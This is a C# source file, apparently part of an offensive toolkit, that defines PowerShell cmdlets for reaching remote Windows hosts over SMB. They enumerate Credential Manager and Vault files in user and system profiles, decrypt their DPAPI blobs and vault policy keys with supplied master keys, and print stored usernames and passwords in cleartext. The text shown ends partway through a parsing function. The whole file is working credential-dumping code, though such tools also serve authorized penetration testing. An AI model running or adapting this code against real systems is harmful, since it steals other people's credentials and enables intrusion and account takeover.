using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Threading;
using Titanis;
using Titanis.Net;
using Titanis.Smb2;
using Titanis.Winterop;
using Titanis.Winterop.Security;
using Winterop = Titanis.Winterop;

namespace Titanis.Tbo.Smb2.PowerShell
{
	[Flags]
	public enum CredManScope
	{
		None = 0,
		User = 1,
		Machine = 2,
		All = User | Machine
	}

	public sealed class TboCredManFileInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string Scope { get; init; } = string.Empty;
		public string? UserName { get; init; }
		public string? UserSid { get; init; }
		public string? ProfilePath { get; init; }
		public string Container { get; init; } = string.Empty;
		public string? VaultGuid { get; init; }
		public string FileName { get; init; } = string.Empty;
		public string Path { get; init; } = string.Empty;
		public ulong? FileSize { get; init; }
		public DateTime? FileCreationTime { get; init; }
		public DateTime? FileLastWriteTime { get; init; }
		public DateTime? FileLastChangeTime { get; init; }
		public bool IsSystemProfile { get; init; }
	}

	public sealed class TboCredManEntryInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string Scope { get; init; } = string.Empty;
		public string? UserName { get; init; }
		public string? UserSid { get; init; }
		public string? ProfilePath { get; init; }
		public string Container { get; init; } = string.Empty;
		public string? VaultGuid { get; init; }
		public string SourcePath { get; init; } = string.Empty;
		public ulong? FileSize { get; init; }
		public DateTime? FileCreationTime { get; init; }
		public DateTime? FileLastWriteTime { get; init; }
		public DateTime? FileLastChangeTime { get; init; }
		public int? DpapiBlobOffset { get; init; }
		public int BytesScanned { get; init; }
		public byte[]? RawBytes { get; init; }
		public bool HasDpapiBlob => this.DpapiBlobOffset.HasValue;
		public string? CredentialGuid { get; init; }
		public string? MasterKeyGuid { get; init; }
		public uint Flags { get; init; }
		public string? Description { get; init; }
		public uint CryptAlgorithmId { get; init; }
		public string? CryptAlgorithm { get; init; }
		public uint HashAlgorithmId { get; init; }
		public string? HashAlgorithm { get; init; }
		public string? Cleartext { get; init; }
		public string? CleartextHex { get; init; }
		public byte[]? CleartextBytes { get; init; }
		public bool HmacValidated { get; init; }
		public string? FailureReason { get; init; }
	}

	internal static class CredManHelpers
	{
		internal static string NormalizeServerName(string? serverName)
			=> DpapiHelpers.NormalizeServerName(serverName);

		internal static string NormalizeShareName(string? shareName)
			=> DpapiHelpers.NormalizeShareName(shareName);

		internal static IReadOnlyList<WildcardPattern> BuildUserFilters(string[]? filters)
		{
			if (filters == null || filters.Length == 0)
				return Array.Empty<WildcardPattern>();

			var patterns = new List<WildcardPattern>();
			foreach (var filter in filters)
			{
				if (string.IsNullOrWhiteSpace(filter))
					continue;
				patterns.Add(new WildcardPattern(filter, WildcardOptions.IgnoreCase));
			}

			return patterns;
		}

		internal static int? FindDpapiOffset(ReadOnlySpan<byte> buffer)
		{
			var offset = DpapiHelpers.FindMagicOffset(buffer);
			return offset >= 0 ? offset : null;
		}

		internal static bool IsMissingPath(NtstatusException ex)
		{
			return ex.StatusCode is Ntstatus.STATUS_OBJECT_NAME_NOT_FOUND
				or Ntstatus.STATUS_OBJECT_PATH_NOT_FOUND
				or Ntstatus.STATUS_OBJECT_NAME_INVALID;
		}

		internal static bool IsAccessDenied(NtstatusException ex)
		{
			return ex.StatusCode is Ntstatus.STATUS_ACCESS_DENIED
				or Ntstatus.STATUS_PRIVILEGE_NOT_HELD;
		}
	}

	[Cmdlet(VerbsCommon.Get, "TBOCredManFiles")]
	[OutputType(typeof(TboCredManFileInfo))]
	public sealed class GetTBOCredManFiles : SmbCmdlet
	{
		[Parameter(Mandatory = true, Position = 0, ValueFromPipelineByPropertyName = true)]
		public string ServerName { get; set; } = string.Empty;

		[Parameter]
		public CredManScope Scope { get; set; } = CredManScope.All;

		[Parameter]
		public string ShareName { get; set; } = CredManLocator.DefaultShareName;

		[Parameter]
		public string[]? UserName { get; set; }

		[Parameter]
		public bool IncludeSystemProfiles { get; set; } = true;

		private CancellationTokenSource? _cancelSource;

		protected override void ProcessRecord(ISmbProviderInfo smb)
		{
			this._cancelSource ??= new CancellationTokenSource();
			var cancellationToken = this._cancelSource.Token;

			var serverName = CredManHelpers.NormalizeServerName(this.ServerName);
			if (string.IsNullOrWhiteSpace(serverName))
				throw new ArgumentException("ServerName must be provided.", nameof(this.ServerName));

			var shareName = CredManHelpers.NormalizeShareName(this.ShareName);
			if (string.IsNullOrWhiteSpace(shareName))
				throw new ArgumentException("ShareName must be provided.", nameof(this.ShareName));

			var userFilters = CredManHelpers.BuildUserFilters(this.UserName);

			var results = CredManLocator.Enumerate(
				smb,
				serverName,
				shareName,
				this.Scope,
				userFilters,
				this.IncludeSystemProfiles,
				message => this.LogWarning(smb, message),
				message => this.LogVerbose(smb, message),
				(context, ex) => this.LogException(smb, context, ex, emitWarning: false),
				cancellationToken);

			foreach (var entry in results)
			{
				this.WriteObject(entry);
			}
		}

		protected override void StopProcessing()
		{
			this._cancelSource?.Cancel();
			base.StopProcessing();
		}
	}

	[Cmdlet(VerbsCommon.Get, "TBOCredManEntry", DefaultParameterSetName = PathParameterSet)]
	[OutputType(typeof(TboCredManEntryInfo))]
	public sealed class GetTBOCredManEntry : SmbCmdlet
	{
		private const string PathParameterSet = "Path";
		private const string InputParameterSet = "Input";
		private const int DefaultMaxBytes = 1024 * 1024;
		private const int MinFragmentLength = 6;
		private const int MaxFragmentLength = 256;
		private const int MaxFragments = 12;
		private const int MaxCredentialStringBytes = 8192;

		private const string TaskSchedulerMarker = "Domain:batch=TaskScheduler:Task:";

		private static readonly byte[] TaskSchedulerMarkerBytes = System.Text.Encoding.Unicode.GetBytes(TaskSchedulerMarker);
		private static readonly SecretDecodeOptions CredManDecodeOptions = new SecretDecodeOptions
		{
			MinTextLength = 1,
			MinAsciiCount = 8,
			MinAsciiRatio = 0.5,
			MinPrintableRatio = 0.8,
			MaxNonAsciiRatio = 0.4,
			RejectReplacementChar = false,
			AllowControlChars = true
		};
		private static readonly SecretDecodeOptions CredManFragmentOptions = new SecretDecodeOptions
		{
			MinTextLength = MinFragmentLength,
			MinAsciiCount = 0,
			MinAsciiRatio = 0.0,
			MinPrintableRatio = 0.0,
			MaxNonAsciiRatio = 1.0,
			RejectReplacementChar = false,
			AllowControlChars = true,
			MinFragmentLength = MinFragmentLength,
			MaxFragmentLength = MaxFragmentLength,
			MaxFragments = MaxFragments
		};

		[Parameter(Mandatory = true, Position = 0, ValueFromPipelineByPropertyName = true, ParameterSetName = PathParameterSet)]
		public string ServerName { get; set; } = string.Empty;

		[Parameter(Mandatory = true, Position = 1, ValueFromPipelineByPropertyName = true, ParameterSetName = PathParameterSet)]
		public string Path { get; set; } = string.Empty;

		[Parameter(Mandatory = true, ValueFromPipeline = true, ParameterSetName = InputParameterSet)]
		public TboCredManFileInfo? InputObject { get; set; }

		[Parameter]
		[ValidateRange(1, int.MaxValue)]
		public int MaxBytes { get; set; } = DefaultMaxBytes;

		[Parameter]
		public SwitchParameter IncludeRawBytes { get; set; }

		[Parameter]
		public string? MasterKey { get; set; }

		[Parameter]
		public byte[]? MasterKeyBytes { get; set; }

		[Parameter]
		public TboDpapiMasterKeyInfo[]? MasterKeys { get; set; }

		[Parameter]
		public string? Entropy { get; set; }

		[Parameter]
		public byte[]? EntropyBytes { get; set; }

		protected override void ProcessRecord(ISmbProviderInfo smb)
		{
			var input = this.InputObject;
			var serverName = input?.ServerName ?? CredManHelpers.NormalizeServerName(this.ServerName);
			if (string.IsNullOrWhiteSpace(serverName))
				throw new ArgumentException("ServerName must be provided.", nameof(this.ServerName));

			var sourcePath = input?.Path ?? this.Path;
			if (string.IsNullOrWhiteSpace(sourcePath))
				throw new ArgumentException("Path must be provided.", nameof(this.Path));

			var uncPath = ResolveToUncPath(sourcePath, nameof(this.Path));
			if (string.IsNullOrEmpty(uncPath.ShareName))
				throw new ArgumentException($"Path must include a share name: {uncPath}", nameof(this.Path));

			if (!string.IsNullOrEmpty(uncPath.ServerName)
				&& !uncPath.ServerName.Equals(serverName, StringComparison.OrdinalIgnoreCase))
				throw new ArgumentException($"ServerName '{serverName}' does not match UNC host '{uncPath.ServerName}'.", nameof(this.ServerName));

			var fileSystem = SmbFileSystemResolver.Resolve(smb);
			var masterKey = ResolveMasterKey();
			var masterKeySet = ResolveMasterKeySet(smb);
			if ((this.MasterKeyBytes != null || !string.IsNullOrWhiteSpace(this.MasterKey)) && (masterKey == null || masterKey.Length == 0))
				throw new ArgumentException("MasterKey must be provided (hex) or MasterKeyBytes must be set.", nameof(this.MasterKey));
			if (this.MasterKeys != null && this.MasterKeys.Length > 0 && masterKeySet.Count == 0)
				this.LogWarning(smb, "Get-TBOCredManEntry did not receive any usable master keys (missing MasterKeyGuid or MasterKey).");
			var entropy = ResolveEntropy();
			ReadCredManFile(smb, fileSystem, uncPath, input, masterKey, masterKeySet, entropy);
		}

		private void ReadCredManFile(
			ISmbProviderInfo smb,
			ISmbFileSystem fileSystem,
			UncPath path,
			TboCredManFileInfo? input,
			byte[]? masterKey,
			IReadOnlyDictionary<Guid, byte[]> masterKeySet,
			byte[]? entropy)
		{
			byte[]? buffer = null;
			int bytesRead = 0;
			ulong? fileSize = input?.FileSize;
			try
			{
				using var file = fileSystem.OpenFileRead(path, CancellationToken.None);
				var length = file.Length;
				if (length >= 0)
					fileSize ??= (ulong)length;

				var scanLength = (int)Math.Min(length, this.MaxBytes);
				if (scanLength < 0)
					scanLength = this.MaxBytes;

				buffer = scanLength == 0 ? Array.Empty<byte>() : new byte[scanLength];
				using var stream = file.OpenRead();
				bytesRead = ReadPrefix(stream, buffer);
			}
			catch (NtstatusException ex) when (CredManHelpers.IsMissingPath(ex))
			{
				this.LogWarning(smb, $"Get-TBOCredManEntry could not open {path}: {ex.StatusCode}.");
				return;
			}
			catch (NtstatusException ex) when (CredManHelpers.IsAccessDenied(ex))
			{
				this.LogWarning(smb, $"Get-TBOCredManEntry was denied access to {path}: {ex.StatusCode}.");
				return;
			}
			catch (Exception ex)
			{
				this.LogException(smb, $"Get-TBOCredManEntry failed to read {path}", ex, emitWarning: false);
				throw;
			}

			int? offset = CredManHelpers.FindDpapiOffset(buffer.AsSpan(0, bytesRead));
			var decryptResult = TryDecryptBlob(buffer.AsSpan(0, bytesRead), offset, masterKey, masterKeySet, entropy);
			var cleartextBytes = decryptResult.Cleartext;
			if (cleartextBytes == null && !string.IsNullOrWhiteSpace(decryptResult.FailureReason))
			{
				this.LogVerbose(smb, $"Get-TBOCredManEntry did not decrypt DPAPI blob for {path}: {decryptResult.FailureReason}");
			}
			var cleartextText = cleartextBytes != null
				? TryDecodeCleartext(cleartextBytes, message => this.LogVerbose(smb, message))
				: null;
			if (cleartextBytes != null && cleartextText == null)
			{
				this.LogVerbose(smb, $"Get-TBOCredManEntry could not decode cleartext from DPAPI payload for {path} (length {cleartextBytes.Length}).");
			}
			if (cleartextText == null)
			{
				cleartextText = TryDecodeVaultCredentialFile(
					smb,
					fileSystem,
					path,
					buffer.AsSpan(0, bytesRead),
					this.MaxBytes,
					masterKey,
					masterKeySet,
					entropy,
					message => this.LogVerbose(smb, message));
			}
			this.WriteObject(new TboCredManEntryInfo
			{
				ServerName = input?.ServerName ?? path.ServerName,
				Scope = input?.Scope ?? string.Empty,
				UserName = input?.UserName,
				UserSid = input?.UserSid,
				ProfilePath = input?.ProfilePath,
				Container = input?.Container ?? string.Empty,
				VaultGuid = input?.VaultGuid,
				SourcePath = path.ToString(),
				FileSize = fileSize,
				FileCreationTime = input?.FileCreationTime,
				FileLastWriteTime = input?.FileLastWriteTime,
				FileLastChangeTime = input?.FileLastChangeTime,
				DpapiBlobOffset = offset,
				BytesScanned = bytesRead,
				RawBytes = this.IncludeRawBytes.IsPresent ? buffer?.Take(bytesRead).ToArray() : null,
				CredentialGuid = decryptResult.CredentialGuid,
				MasterKeyGuid = decryptResult.MasterKeyGuid,
				Flags = decryptResult.Flags,
				Description = decryptResult.Description,
				CryptAlgorithmId = decryptResult.CryptAlgorithmId,
				CryptAlgorithm = decryptResult.CryptAlgorithm,
				HashAlgorithmId = decryptResult.HashAlgorithmId,
				HashAlgorithm = decryptResult.HashAlgorithm,
				Cleartext = cleartextText,
				CleartextHex = cleartextBytes?.ToHexString(),
				CleartextBytes = cleartextBytes,
				HmacValidated = decryptResult.HmacValidated,
				FailureReason = decryptResult.FailureReason
			});
		}

		private static int ReadPrefix(Stream stream, byte[] buffer)
		{
			if (buffer.Length == 0)
				return 0;

			int totalRead = 0;
			while (totalRead < buffer.Length)
			{
				var read = stream.Read(buffer, totalRead, buffer.Length - totalRead);
				if (read <= 0)
					break;
				totalRead += read;
			}

			return totalRead;
		}

		private static CredManDecryptResult TryDecryptBlob(
			ReadOnlySpan<byte> buffer,
			int? offset,
			byte[]? masterKey,
			IReadOnlyDictionary<Guid, byte[]> masterKeySet,
			byte[]? entropy)
		{
			if ((masterKey == null || masterKey.Length == 0) && (masterKeySet == null || masterKeySet.Count == 0))
				return CredManDecryptResult.None;

			if (!offset.HasValue || offset.Value < 0 || offset.Value >= buffer.Length)
			{
				return new CredManDecryptResult
				{
					FailureReason = "DPAPI blob not found."
				};
			}

			DpapiBlob blob;
			try
			{
				blob = DpapiBlob.Parse(buffer, offset.Value);
			}
			catch (Exception ex)
			{
				return new CredManDecryptResult
				{
					FailureReason = $"Failed to parse DPAPI blob: {ex.Message}"
				};
			}

			var credentialGuid = blob.GuidCredential.ToString();
			var masterKeyGuid = blob.GuidMasterKey.ToString();
			var flags = blob.Flags;
			var description = blob.Description;
			var cryptAlgorithmId = blob.CryptAlgorithm;
			var cryptAlgorithm = ResolveCryptAlgorithmName(blob.CryptAlgorithm, blob.CryptAlgorithmLength);
			var hashAlgorithmId = blob.HashAlgorithm;
			var hashAlgorithm = ResolveHashAlgorithmName(blob.HashAlgorithm, blob.HashAlgorithmLength);

			byte[]? selectedKey = masterKey;
			if ((selectedKey == null || selectedKey.Length == 0) && masterKeySet != null && masterKeySet.Count > 0)
			{
				if (!masterKeySet.TryGetValue(blob.GuidMasterKey, out selectedKey) || selectedKey == null || selectedKey.Length == 0)
				{
					return new CredManDecryptResult
					{
						CredentialGuid = credentialGuid,
						MasterKeyGuid = masterKeyGuid,
						Flags = flags,
						Description = description,
						CryptAlgorithmId = cryptAlgorithmId,
						CryptAlgorithm = cryptAlgorithm,
						HashAlgorithmId = hashAlgorithmId,
						HashAlgorithm = hashAlgorithm,
						FailureReason = $"Master key {blob.GuidMasterKey} was not found in the supplied key set."
					};
				}
			}

			if (selectedKey == null || selectedKey.Length == 0)
			{
				return new CredManDecryptResult
				{
					CredentialGuid = credentialGuid,
					MasterKeyGuid = masterKeyGuid,
					Flags = flags,
					Description = description,
					CryptAlgorithmId = cryptAlgorithmId,
					CryptAlgorithm = cryptAlgorithm,
					HashAlgorithmId = hashAlgorithmId,
					HashAlgorithm = hashAlgorithm
				};
			}

			var result = DpapiBlobCrypto.Decrypt(blob, selectedKey, entropy);
			return new CredManDecryptResult
			{
				CredentialGuid = credentialGuid,
				MasterKeyGuid = masterKeyGuid,
				Flags = flags,
				Description = description,
				CryptAlgorithmId = cryptAlgorithmId,
				CryptAlgorithm = cryptAlgorithm,
				HashAlgorithmId = hashAlgorithmId,
				HashAlgorithm = hashAlgorithm,
				Cleartext = result.Cleartext,
				HmacValidated = result.HmacValidated,
				FailureReason = result.FailureReason
			};
		}

		private UncPath ResolveToUncPath(string path, string paramName)
		{
			if (string.IsNullOrWhiteSpace(path))
				throw new ArgumentException("Path must be provided.", paramName);

			if (UncPath.TryParse(path, out var uncPath) && uncPath != null)
				return uncPath;

			ProviderInfo? providerInfo;
			PSDriveInfo? driveInfo;
			string providerPath;
			try
			{
				providerPath = this.SessionState.Path.GetUnresolvedProviderPathFromPSPath(path, out providerInfo, out driveInfo);
			}
			catch (Exception ex)
			{
				throw new ArgumentException($"Path could not be resolved: {path}", paramName, ex);
			}

			if (providerInfo == null || !providerInfo.Name.Equals(SmbProvider.ProviderName, StringComparison.OrdinalIgnoreCase))
				throw new ArgumentException($"Path must be a UNC path or a {SmbProvider.ProviderName} PSDrive path: {path}", paramName);

			if (UncPath.TryParse(providerPath, out var resolvedUnc) && resolvedUnc != null)
				return resolvedUnc;

			throw new ArgumentException($"Resolved provider path is not a UNC path: {providerPath}", paramName);
		}

		private static string ResolveCryptAlgorithmName(uint algoId, uint algoLen)
		{
			return algoId switch
			{
				0x6601 => "DES",
				0x6603 => "DES3",
				0x660e => "AES-128",
				0x660f => "AES-192",
				0x6610 => "AES-256",
				0x6611 => algoLen switch
				{
					128 => "AES-128",
					192 => "AES-192",
					256 => "AES-256",
					_ => "AES"
				},
				_ => $"0x{algoId:x}"
			};
		}

		private static string ResolveHashAlgorithmName(uint algoId, uint algoLen)
		{
			if (algoId == 0x8009)
			{
				if (algoLen >= 512)
					return "SHA512";
				if (algoLen >= 384)
					return "SHA384";
				if (algoLen >= 256)
					return "SHA256";
				return "SHA1";
			}

			return algoId switch
			{
				0x8003 => "MD5",
				0x8004 => "SHA1",
				0x800c => "SHA256",
				0x800d => "SHA384",
				0x800e => "SHA512",
				_ => $"0x{algoId:x}"
			};
		}

		private byte[]? ResolveMasterKey()
		{
			if (this.MasterKeyBytes != null && this.MasterKeyBytes.Length > 0)
				return this.MasterKeyBytes;
			if (!string.IsNullOrWhiteSpace(this.MasterKey))
				return BinaryHelper.ParseHexString(this.MasterKey.AsSpan());
			return null;
		}

		private IReadOnlyDictionary<Guid, byte[]> ResolveMasterKeySet(ISmbProviderInfo smb)
		{
			if (this.MasterKeys == null || this.MasterKeys.Length == 0)
				return new Dictionary<Guid, byte[]>();

			var results = new Dictionary<Guid, byte[]>();
			foreach (var entry in this.MasterKeys)
			{
				if (entry == null)
					continue;
				if (string.IsNullOrWhiteSpace(entry.MasterKeyGuid) || string.IsNullOrWhiteSpace(entry.MasterKey))
					continue;
				if (!Guid.TryParse(entry.MasterKeyGuid, out var guid))
					continue;

				byte[] keyBytes;
				try
				{
					keyBytes = BinaryHelper.ParseHexString(entry.MasterKey.AsSpan());
				}
				catch (Exception ex)
				{
					this.LogWarning(smb, $"Get-TBOCredManEntry failed to parse master key {entry.MasterKeyGuid}: {ex.Message}");
					continue;
				}

				if (keyBytes.Length == 0)
					continue;
				results[guid] = keyBytes;
			}

			return results;
		}

		private byte[]? ResolveEntropy()
		{
			if (this.EntropyBytes != null && this.EntropyBytes.Length > 0)
				return this.EntropyBytes;
			if (!string.IsNullOrWhiteSpace(this.Entropy))
				return BinaryHelper.ParseHexString(this.Entropy.AsSpan());
			return null;
		}

		private static string? TryDecodeCleartext(byte[] payload, Action<string>? log = null)
		{
			if (payload.Length == 0)
				return null;

			if (TryDecodeTaskSchedulerCleartext(payload, out var taskText))
				return taskText;

			if (TryDecodeCredentialCleartext(payload, out var credentialText))
				return credentialText;

			if (TryDecodeVaultPolicyCleartext(payload, out var vaultText))
				return vaultText;

			log ??= _ => { };
			var decodeMessages = new List<string>();
			var result = SecretDecoding.TryDecode(payload, CredManDecodeOptions, message => decodeMessages.Add(message));
			if (!string.IsNullOrWhiteSpace(result.Text))
				return result.Text;

			if (decodeMessages.Count > 0)
			{
				foreach (var message in decodeMessages)
					log(message);
			}

			var fragmentText = TryExtractReadableCleartext(payload);
			if (fragmentText == null)
				log("SecretDecoding fragment fallback did not produce readable text.");
			return fragmentText;
		}

		private static string? TryDecodeVaultCredentialFile(
			ISmbProviderInfo smb,
			ISmbFileSystem fileSystem,
			UncPath path,
			ReadOnlySpan<byte> fileBytes,
			int maxBytes,
			byte[]? masterKey,
			IReadOnlyDictionary<Guid, byte[]> masterKeySet,
			byte[]? entropy,
			Action<string>? logVerbose)
		{
			logVerbose ??= _ => { };

			var fileName = path.GetFileName();
			if (string.IsNullOrWhiteSpace(fileName))
				return null;

			var extension = System.IO.Path.GetExtension(fileName);
			if (!extension.Equals(".vcrd", StringComparison.OrdinalIgnoreCase)
				&& !extension.Equals(".vsch", StringComparison.OrdinalIgnoreCase))
				return null;

			if ((masterKey == null || masterKey.Length == 0) && (masterKeySet == null || masterKeySet.Count == 0))
				return null;

			var policyPath = path.GetDirectoryPath().Append("Policy.vpol");
			if (!TryReadFileBytes(fileSystem, policyPath, maxBytes, out var policyBytes, out var policyLength, out var policyFailure))
			{
				if (!string.IsNullOrWhiteSpace(policyFailure))
					logVerbose($"Get-TBOCredManEntry could not read vault policy file {policyPath}: {policyFailure}.");
				return null;
			}

			var policySpan = policyBytes.AsSpan(0, policyLength);
			var policyOffset = CredManHelpers.FindDpapiOffset(policySpan);
			var policyDecrypt = TryDecryptBlob(policySpan, policyOffset, masterKey, masterKeySet, entropy);
			if (policyDecrypt.Cleartext == null || policyDecrypt.Cleartext.Length == 0)
			{
				var reason = string.IsNullOrWhiteSpace(policyDecrypt.FailureReason)
					? "no cleartext returned"
					: policyDecrypt.FailureReason;
				logVerbose($"Get-TBOCredManEntry could not decrypt vault policy {policyPath}: {reason}.");
				return null;
			}

			if (!TryParseVaultPolicyKeys(policyDecrypt.Cleartext, out var aes128Key, out var aes256Key))
			{
				logVerbose($"Get-TBOCredManEntry could not parse vault policy keys from {policyPath}.");
				return null;
			}

			aes128Key ??= Array.Empty<byte>();
			if (aes256Key == null || aes256Key.Length == 0)
			{
				logVerbose($"Get-TBOCredManEntry did not find a Vault AES-256 key in {policyPath}.");
				return null;
			}

			if (!TryParseVaultCredential(fileBytes, aes128Key, aes256Key, out var text))
			{
				logVerbose($"Get-TBOCredManEntry could not parse vault credential data in {path}.");
				return null;
			}

			return text;
		}

		private static bool TryReadFileBytes(
			ISmbFileSystem fileSystem,
			UncPath path,
			int maxBytes,
			out byte[] buffer,
			out int bytesRead,
			out string? failureReason)
		{
			buffer = Array.Empty<byte>();
			bytesRead = 0;
			failureReason = null;

			try
			{
				using var file = fileSystem.OpenFileRead(path, CancellationToken.None);
				var length = file.Length;
				var scanLength = (int)Math.Min(length, maxBytes);
				if (scanLength < 0)
					scanLength = maxBytes;

				buffer = scanLength == 0 ? Array.Empty<byte>() : new byte[scanLength];
				using var stream = file.OpenRead();
				bytesRead = ReadPrefix(stream, buffer);
				return true;
			}
			catch (NtstatusException ex) when (CredManHelpers.IsMissingPath(ex))
			{
				failureReason = ex.StatusCode.ToString();
				return false;
			}
			catch (NtstatusException ex) when (CredManHelpers.IsAccessDenied(ex))
			{
				failureReason = ex.StatusCode.ToString();
				return false;
			}
			catch (Exception ex)
			{
				failureReason = ex.Message;
				return false;
			}
		}

		private static bool TryParseVaultPolicyKeys(byte[] payload, out byte[]? aes128Key, out byte[]? aes256Key)
		{
			return TryParseVaultPolicyKdbm(payload, out aes128Key, out aes256Key)
				|| TryParseVaultPolicyKssm(payload, out aes128Key, out aes256Key);
		}

		private static bool TryParseVaultCredential(
			ReadOnlySpan<byte> vaultBytes,
			byte[] aes128Key,
			byte[] aes256Key,
			out string? text)
		{
			text = null;

			if (vaultBytes.Length < 40)
				return false;

			var lines = new List<string>();
			var offset = 0;
			var finalAttributeOffset = 0;

			offset += 16; // schema guid
			if (!TryReadInt32Value(vaultBytes, ref offset, out var unk0))
				return false;
			if (!TryReadInt64Value(vaultBytes, ref offset, out var lastWritten))
				return false;
			offset += 8; // unk1 + unk2

			if (!TryReadInt32Value(vaultBytes, ref offset, out var friendlyNameLen))
				return false;
			if (!TryReadUnicodeString(vaultBytes, ref offset, friendlyNameLen, out var friendlyName))
				return false;

			if (TryGetFileTimeUtc(lastWritten, out var lastWrittenTime))
				lines.Add($"LastWritten: {lastWrittenTime:O}");
			AddField(lines, "FriendlyName", friendlyName, requireLetters: false);

			if (!TryReadInt32Value(vaultBytes, ref offset, out var attributeMapLen))
				return false;
			if (attributeMapLen < 0 || attributeMapLen > vaultBytes.Length - offset)
				return false;

			var numberOfAttributes = attributeMapLen / 12;
			var attributeMap = new Dictionary<int, int>();

			for (var i = 0; i < numberOfAttributes; i++)
			{
				if (!TryReadInt32Value(vaultBytes, ref offset, out var attributeNum))
					return false;
				if (!TryReadInt32Value(vaultBytes, ref offset, out var attributeOffset))
					return false;
				offset += 8; // skip unk

				if (attributeOffset >= 0 && attributeOffset < vaultBytes.Length)
					attributeMap[attributeNum] = attributeOffset;
			}

			var itemLines = new List<string>();
			foreach (var attribute in attributeMap)
			{
				var attributeOffset = attribute.Value;
				attributeOffset += 16;

				if (attribute.Key >= 100)
					attributeOffset += 4;

				if (!TryReadInt32Value(vaultBytes, ref attributeOffset, out var dataLen))
					continue;
				if (dataLen <= 0 || dataLen > vaultBytes.Length - attributeOffset)
					continue;

				if (attributeOffset >= vaultBytes.Length)
					continue;

				var ivPresent = vaultBytes[attributeOffset] != 0;
				attributeOffset += 1;
				finalAttributeOffset = attributeOffset;

				if (!ivPresent)
				{
					attributeOffset += Math.Max(0, dataLen - 1);
					finalAttributeOffset = attributeOffset;
					continue;
				}

				if (!TryReadInt32Value(vaultBytes, ref attributeOffset, out var ivLen))
					continue;
				if (ivLen <= 0 || ivLen > vaultBytes.Length - attributeOffset)
					continue;

				if (!TryReadBytes(vaultBytes, ref attributeOffset, ivLen, out var ivBytes))
					continue;

				var dataBytesLen = dataLen - 1 - 4 - ivLen;
				if (dataBytesLen <= 0 || dataBytesLen > vaultBytes.Length - attributeOffset)
					continue;

				if (!TryReadBytes(vaultBytes, ref attributeOffset, dataBytesLen, out var dataBytes))
					continue;

				finalAttributeOffset = attributeOffset;

				var decrypted = DecryptVaultData(aes256Key, ivBytes, dataBytes);
				if (decrypted.Length > 0)
					TryParseVaultItem(decrypted, itemLines);
			}

			if (numberOfAttributes > 0 && unk0 < 4 && finalAttributeOffset > 2)
			{
				var clearOffset = finalAttributeOffset - 2;
				if (clearOffset >= 0 && clearOffset < vaultBytes.Length)
				{
					var clearSpan = vaultBytes.Slice(clearOffset);
					var clearOffset2 = 0;
					if (TryReadInt32Value(clearSpan, ref clearOffset2, out var clearId))
					{
						if (TryReadInt32Value(clearSpan, ref clearOffset2, out var clearLen))
						{
							if (clearLen > 0 && clearLen <= 2000 && clearOffset2 < clearSpan.Length)
							{
								var ivPresent = clearSpan[clearOffset2] != 0;
								clearOffset2 += 1;
								if (ivPresent)
								{
									if (TryReadInt32Value(clearSpan, ref clearOffset2, out var ivLen))
									{
										if (ivLen > 0 && ivLen <= clearSpan.Length - clearOffset2)
										{
											if (TryReadBytes(clearSpan, ref clearOffset2, ivLen, out var ivBytes))
											{
												var dataBytesLen = clearLen - 1 - 4 - ivLen;
												if (dataBytesLen > 0 && dataBytesLen <= clearSpan.Length - clearOffset2)
												{
													if (TryReadBytes(clearSpan, ref clearOffset2, dataBytesLen, out var dataBytes))
													{
														var decrypted = DecryptVaultData(aes256Key, ivBytes, dataBytes);
														if (decrypted.Length > 0)
															TryParseVaultItem(decrypted, itemLines);
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}

			if (itemLines.Count == 0 && lines.Count == 0)
				return false;

			lines.AddRange(itemLines);
			text = string.Join(Environment.NewLine, lines);
			return true;
		}

		private static void TryParseVaultItem(byte[] vaultItemBytes, List<string> lines)
		{
			if (vaultItemBytes.Length < 12)
				return;

			var offset = 0;
			if (!TryReadInt32Value(vaultItemBytes, ref offset, out var version))
				return;
			if (!TryReadInt32Value(vaultItemBytes, ref offset, out var count))
				return;
			offset += 4; // skip unk

			for (var i = 0; i < count; i++)
			{
				if (!TryReadInt32Value(vaultItemBytes, ref offset, out var id))
					return;
				if (!TryReadInt32Value(vaultItemBytes, ref offset, out var size))
					return;
				if (size < 0 || size > vaultItemBytes.Length - offset)
					return;

				var entryData = vaultItemBytes.AsSpan(offset, size).ToArray();
				offset += size;

				var entryString = string.Empty;
				if (size > 0 && size <= MaxCredentialStringBytes)
				{
					try
					{
						entryString = System.Text.Encoding.Unicode.GetString(entryData).TrimEnd('\0');
					}
					catch
					{
						entryString = string.Empty;
					}
				}

				switch (id)
				{
					case 1:
						AddField(lines, "Resource", entryString, requireLetters: true);
						break;
					case 2:
						AddField(lines, "Identity", entryString, requireLetters: true);
						break;
					case 3:
						AddField(lines, "Authenticator", entryString, requireLetters: false);
						break;
					default:
						if (IsMostlyPrintable(entryString))
						{
							lines.Add($"Property {id}: {entryString.Trim()}");
						}
						else
						{
							lines.Add($"Property {id}Hex: {entryData.ToHexString()}");
						}
						break;
				}
			}
		}

		private static byte[] DecryptVaultData(byte[] key, byte[] iv, byte[] data)
		{
			using var aes = System.Security.Cryptography.Aes.Create();
			aes.Key = key;
			if (iv.Length > 0)
				aes.IV = iv;
			aes.Mode = System.Security.Cryptography.CipherMode.CBC;

			using var decryptor = aes.CreateDecryptor();
			return decryptor.TransformFinalBlock(data, 0, data.Length);
		}

		private static bool TryDecodeCredentialCleartext(byte[] payload, out string? text)
		{
			text = null;
			var offset = 0;

			if (!TryReadUInt32Value(payload, ref offset, out var credFlags))
				return false;
			if (!TryReadUInt32Value(payload, ref offset, out var credSize))
				return false;
			if (credSize > payload.Length)
				return false;
			if (!TryReadUInt32Value(payload, ref offset, out var credUnk0))
				return false;
			if (!TryReadUInt32Value(payload, ref offset, out var type))
				return false;
			if (!TryReadUInt32Value(payload, ref offset, out var flags))
				return false;
			if (!TryReadInt64Value(payload, ref offset, out var lastWritten))
				return false;

			if (!IsPlausibleFileTime(lastWritten))
				return false;

			if (!TryReadUInt32Value(payload, ref offset, out var unkFlagsOrSize))
				return false;
			if (!TryReadUInt32Value(payload, ref offset, out var persist))
				return false;
			if (!TryReadUInt32Value(payload, ref offset, out var attributeCount))
				return false;
			if (!TryReadUInt32Value(payload, ref offset, out var unk0))
				return false;
			if (!TryReadUInt32Value(payload, ref offset, out var unk1))
				return false;

			if (!TryReadUnicodeWithLength(payload, ref offset, out var targetName))
				return false;
